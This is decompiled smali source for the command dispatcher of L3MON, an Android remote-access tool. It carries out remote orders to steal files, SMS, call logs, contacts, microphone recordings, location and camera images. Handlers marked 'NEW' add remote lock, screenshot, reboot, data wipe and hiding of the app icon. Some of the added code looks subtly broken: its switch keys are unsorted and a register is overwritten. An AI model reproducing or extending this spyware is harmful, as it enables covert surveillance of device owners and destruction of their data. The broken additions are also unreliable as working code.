.class final Lcom/etechd/l3mon/ConnectionManager$2;
.super Ljava/lang/Object;
.source "ConnectionManager.java"

# interfaces
.implements Lio/socket/emitter/Emitter$Listener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/etechd/l3mon/ConnectionManager;->sendReq()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x8
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 0

    .line 44
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public varargs call([Ljava/lang/Object;)V
    .locals 7
    .param p1, "args"    # [Ljava/lang/Object;

    .line 48
    const/4 v0, 0x0

    :try_start_0
    aget-object v1, p1, v0

    check-cast v1, Lorg/json/JSONObject;

    .line 49
    .local v1, "data":Lorg/json/JSONObject;
    const-string v2, "type"

    invoke-virtual {v1, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 52
    .local v2, "order":Ljava/lang/String;
    const/4 v3, -0x1

    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v4

    const/4 v5, 0x1

    sparse-switch v4, :sswitch_data_0

    :cond_0
    goto/16 :goto_0

    :sswitch_0
    const-string v4, "0xWI"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    const/4 v3, 0x6

    goto :goto_0

    :sswitch_1
    const-string v4, "0xSM"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    const/4 v3, 0x1

    goto :goto_0

    :sswitch_2
    const-string v4, "0xPM"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    const/4 v3, 0x7

    goto :goto_0

    :sswitch_3
    const-string v4, "0xMI"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    const/4 v3, 0x4

    goto :goto_0

    :sswitch_4
    const-string v4, "0xLO"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    const/4 v3, 0x5

    goto :goto_0

    :sswitch_5
    const-string v4, "0xIN"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    const/16 v3, 0x8

    goto :goto_0

    :sswitch_6
    const-string v4, "0xGP"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    const/16 v3, 0x9

    goto :goto_0

    :sswitch_7
    const-string v4, "0xFI"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    const/4 v3, 0x0

    goto :goto_0

    :sswitch_8
    const-string v4, "0xCO"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    const/4 v3, 0x3

    goto :goto_0

    :sswitch_9
    const-string v4, "0xCL"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    const/4 v3, 0x2

    goto :goto_0

    :sswitch_a # NEW: 0xLK
    const-string v4, "0xLK"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    const/16 v3, 0xa

    goto :goto_0

    :sswitch_b # NEW: 0xSC
    const-string v4, "0xSC"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    const/16 v3, 0xb

    goto :goto_0

    :sswitch_c # NEW: 0xVB
    const-string v4, "0xVB"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    const/16 v3, 0xc

    goto :goto_0

    :sswitch_d # NEW: 0xRB
    const-string v4, "0xRB"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    const/16 v3, 0xd

    goto :goto_0

    :sswitch_e # NEW: 0xWD
    const-string v4, "0xWD"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    const/16 v3, 0xe

    goto :goto_0

    :sswitch_f # NEW: 0xHO
    const-string v4, "0xHO"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    const/16 v3, 0xf

    goto :goto_0

    :sswitch_10 # NEW: 0xSO
    const-string v4, "0xSO"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    const/16 v3, 0x10

    goto :goto_0

    :sswitch_11 # NEW: 0xGF (GPS Frequency)
    const-string v4, "0xGF"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    const/16 v3, 0x11

    goto :goto_0

    :sswitch_12
    const-string v4, "0xCA"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    const/16 v3, 0x12

    goto :goto_0


    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    const-string v4, "ls"

    const-string v6, "action"

    packed-switch v3, :pswitch_data_0

    :goto_default
    goto/16 :goto_1

    :pswitch_a # NEW: Lock Device
    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;

    invoke-static {v0}, Lcom/etechd/l3mon/MDMActionHandler;->lockScreen(Landroid/content/Context;)V

    goto/16 :goto_1

    :pswitch_b # NEW: Screenshot (MDMActivity)
    new-instance v0, Landroid/content/Intent;

    sget-object v1, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;

    const-class v2, Lcom/etechd/l3mon/MDMActivity;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "action"

    const-string v2, "screenshot"

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    sget-object v1, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_1

    :pswitch_c # NEW: Vibrate
    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;

    const-wide/16 v1, 0x3e8

    invoke-static {v0, v1, v2}, Lcom/etechd/l3mon/MDMActionHandler;->vibrate(Landroid/content/Context;J)V

    goto/16 :goto_1

    :pswitch_d # NEW: Reboot
    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;

    invoke-static {v0}, Lcom/etechd/l3mon/MDMActionHandler;->reboot(Landroid/content/Context;)V

    goto/16 :goto_1

    :pswitch_e # NEW: Wipe Data
    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;

    invoke-static {v0}, Lcom/etechd/l3mon/MDMActionHandler;->wipeData(Landroid/content/Context;)V

    goto/16 :goto_1

    :pswitch_f # NEW: Hide Icon
    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;

    const/4 v1, 0x0

    invoke-static {v0, v1}, Lcom/etechd/l3mon/MDMActionHandler;->setIconVisible(Landroid/content/Context;Z)V

    goto/16 :goto_1

    :pswitch_10 # NEW: Show Icon
    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;

    const/4 v1, 0x1

    invoke-static {v0, v1}, Lcom/etechd/l3mon/MDMActionHandler;->setIconVisible(Landroid/content/Context;Z)V

    goto/16 :goto_1

    :pswitch_11 # NEW: GPS Frequency
    const-string v0, "minTime"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getLong(Ljava/lang/String;)J

    move-result-wide v0

    sget-object v2, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;

    invoke-static {v2, v0, v1}, Lcom/etechd/l3mon/LocManager;->setFrequency(Landroid/content/Context;J)V

    goto/16 :goto_1

    .line 93
    :pswitch_0
    :try_start_1
    const-string v0, "permission"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/etechd/l3mon/ConnectionManager;->GP(Ljava/lang/String;)V

    goto/16 :goto_1

    .line 90
    :pswitch_1
    invoke-static {}, Lcom/etechd/l3mon/ConnectionManager;->IN()V

    .line 91
    goto/16 :goto_1

    .line 87
    :pswitch_2
    invoke-static {}, Lcom/etechd/l3mon/ConnectionManager;->PM()V

    .line 88
    goto/16 :goto_1

    .line 84
    :pswitch_3
    invoke-static {}, Lcom/etechd/l3mon/ConnectionManager;->WI()V

    .line 85
    goto :goto_1

    .line 81
    :pswitch_4
    invoke-static {}, Lcom/etechd/l3mon/ConnectionManager;->LO()V

    .line 82
    goto :goto_1

    .line 78
    :pswitch_5
    const-string v0, "sec"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v0

    invoke-static {v0}, Lcom/etechd/l3mon/ConnectionManager;->MI(I)V

    goto :goto_1

    :pswitch_12 # NEW: Camera Capture
    const-string v0, "camera"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v0

    new-instance v1, Lcom/etechd/l3mon/CameraManager;

    sget-object v2, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {v1, v2}, Lcom/etechd/l3mon/CameraManager;-><init>(Landroid/content/Context;)V

    invoke-virtual {v1, v0}, Lcom/etechd/l3mon/CameraManager;->startUp(I)V


    .line 79
    goto :goto_1

    .line 75
    :pswitch_6
    invoke-static {}, Lcom/etechd/l3mon/ConnectionManager;->CO()V

    .line 76
    goto :goto_1

    .line 72
    :pswitch_7
    invoke-static {}, Lcom/etechd/l3mon/ConnectionManager;->CL()V

    .line 73
    goto :goto_1

    .line 66
    :pswitch_8
    invoke-virtual {v1, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    .line 67
    const/4 v3, 0x0

    invoke-static {v0, v3, v3}, Lcom/etechd/l3mon/ConnectionManager;->SM(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_1

    .line 68
    :cond_1
    invoke-virtual {v1, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v3, "sendSMS"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    .line 69
    const-string v0, "to"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v3, "sms"

    invoke-virtual {v1, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v5, v0, v3}, Lcom/etechd/l3mon/ConnectionManager;->SM(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_1

    .line 60
    :pswitch_9
    invoke-virtual {v1, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    const-string v4, "path"

    if-eqz v3, :cond_2

    .line 61
    :try_start_2
    invoke-virtual {v1, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Lcom/etechd/l3mon/ConnectionManager;->FI(ILjava/lang/String;)V

    goto :goto_1

    .line 62
    :cond_2
    invoke-virtual {v1, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v3, "dl"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    .line 63
    invoke-virtual {v1, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v5, v0}, Lcom/etechd/l3mon/ConnectionManager;->FI(ILjava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 98
    .end local v1    # "data":Lorg/json/JSONObject;
    .end local v2    # "order":Ljava/lang/String;
    :cond_3
    :goto_1
    goto :goto_2

    .line 96
    :catch_0
    move-exception v0

    .line 97
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 99
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_2
    return-void

    nop

    :sswitch_data_0
    .sparse-switch
        0x179cb1 -> :sswitch_9
        0x179cb4 -> :sswitch_8
        0x179d0b -> :sswitch_7
        0x179d31 -> :sswitch_6
        0x179d6d -> :sswitch_5
        0x179dc7 -> :sswitch_a
        0x179dcb -> :sswitch_4
        0x179de4 -> :sswitch_3
        0x179e45 -> :sswitch_2
        0x179e98 -> :sswitch_b
        0x179ea2 -> :sswitch_1
        0x179ef4 -> :sswitch_c
        0x179f1a -> :sswitch_0
        0x179e5a -> :sswitch_d # 0xRB
        0x179f0c -> :sswitch_e # 0xWD
        0x179d89 -> :sswitch_f # 0xHO
        0x179e8d -> :sswitch_10 # 0xSO
        0x179d27 -> :sswitch_11 # 0xGF
        0x179bc6 -> :sswitch_12 # 0xCA
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
        :pswitch_a
        :pswitch_b
        :pswitch_c
        :pswitch_d
        :pswitch_e
        :pswitch_f
        :pswitch_10
        :pswitch_11
        :pswitch_12
    .end packed-switch
.end method
